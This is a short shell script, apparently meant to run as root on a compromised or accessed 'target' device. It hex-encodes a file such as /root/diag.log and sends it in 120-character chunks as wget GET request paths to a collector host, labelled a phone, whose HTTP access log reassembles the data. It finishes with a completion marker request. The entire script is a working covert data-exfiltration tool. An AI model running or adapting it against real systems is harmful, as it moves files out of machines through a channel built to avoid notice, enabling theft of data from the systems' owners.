#!/bin/sh
# Runs ON THE TARGET as root. Ship a file back to the phone as lossless hex chunks.
# The phone collects GET /<PREFIX>N-<hex> lines from its HTTP access log.
# Usage: PREFIX=I FILE=/root/diag.log sh exfil_hex.sh
PREFIX="${PREFIX:-X}"
FILE="${FILE:-/root/diag.log}"
SERVER="${SERVER:-<PHONE-LAN-IP>}"
CHUNK=120
CAP=1600            # generous: a low cap silently truncates the log

h=$(od -An -v -tx1 "$FILE" | tr -d ' \n')
i=1000
while [ -n "$h" ]; do
  c=$(printf %s "$h" | cut -c1-$CHUNK)
  h=$(printf %s "$h" | cut -c$((CHUNK+1))-)
  wget -qO- "http://$SERVER/$PREFIX$i-$c" >/dev/null 2>&1
  i=$((i+1))
  [ "$i" -gt $((1000+CAP)) ] && break
done
wget -qO- "http://$SERVER/${PREFIX}END-$i" >/dev/null 2>&1     # completion marker
